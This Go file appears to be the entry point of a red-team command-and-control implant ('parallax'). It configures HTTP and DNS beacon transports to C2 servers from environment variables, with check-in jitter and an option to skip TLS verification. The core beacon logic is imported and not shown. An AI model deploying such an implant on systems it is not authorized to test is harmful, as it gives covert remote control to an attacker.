// parallax - Meridian implant.
//
// Authorized use only: run this only against servers you own or are
// explicitly permitted to test against.
//
// Configuration via environment variables:
//
//	MERIDIAN_HTTP       base URL, e.g. http://127.0.0.1:8080 (repeatable)
//	MERIDIAN_DNS        resolver host:port, e.g. 127.0.0.1:5353 (repeatable)
//	MERIDIAN_DNS_DOMAIN C2 base domain, e.g. c2.test
//	MERIDIAN_INTERVAL   seconds between checkins (default 30)
//	MERIDIAN_JITTER     jitter fraction (default 0.2)
//	MERIDIAN_INSECURE   skip TLS verification in lab (1)
//	MERIDIAN_VERBOSE    enable logging (1)
package main

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"meridian/implant/internal/mbeacon"
	"meridian/implant/internal/mtransport"
)

const defaultInterval = 30
const defaultJitter = 0.2

func envList(key string) []string {
	var out []string
	for _, v := range os.Environ() {
		if strings.HasPrefix(v, key+"=") {
			out = append(out, strings.TrimPrefix(v, key+"="))
		}
	}
	return out
}

func envBool(key string) bool {
	v := os.Getenv(key)
	return v == "1" || strings.EqualFold(v, "true")
}

func envInt(key string, def int) int {
	if v := os.Getenv(key); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			return n
		}
	}
	return def
}

func envFloat(key string, def float64) float64 {
	if v := os.Getenv(key); v != "" {
		if f, err := strconv.ParseFloat(v, 64); err == nil {
			return f
		}
	}
	return def
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	timeout := 15 * time.Second

	interval := envInt("MERIDIAN_INTERVAL", defaultInterval)
	jitter := envFloat("MERIDIAN_JITTER", defaultJitter)

	var transports []mtransport.Transport
	for _, base := range envList("MERIDIAN_HTTP") {
		transports = append(transports, mtransport.NewHTTP(base, envBool("MERIDIAN_INSECURE"), timeout, interval, jitter))
	}
	for _, server := range envList("MERIDIAN_DNS") {
		domain := os.Getenv("MERIDIAN_DNS_DOMAIN")
		if domain == "" {
			fmt.Fprintln(os.Stderr, "parallax: MERIDIAN_DNS_DOMAIN required for DNS transport")
			os.Exit(2)
		}
		transports = append(transports, mtransport.NewDNS(server, domain, timeout))
	}
	if len(transports) == 0 {
		fmt.Fprintln(os.Stderr, "parallax: no transports configured (set MERIDIAN_HTTP and/or MERIDIAN_DNS)")
		os.Exit(2)
	}

	b := mbeacon.New(transports, interval, jitter, envBool("MERIDIAN_VERBOSE"))
	log.Printf("parallax started with %d transport(s)", len(transports))
	b.Run()
}
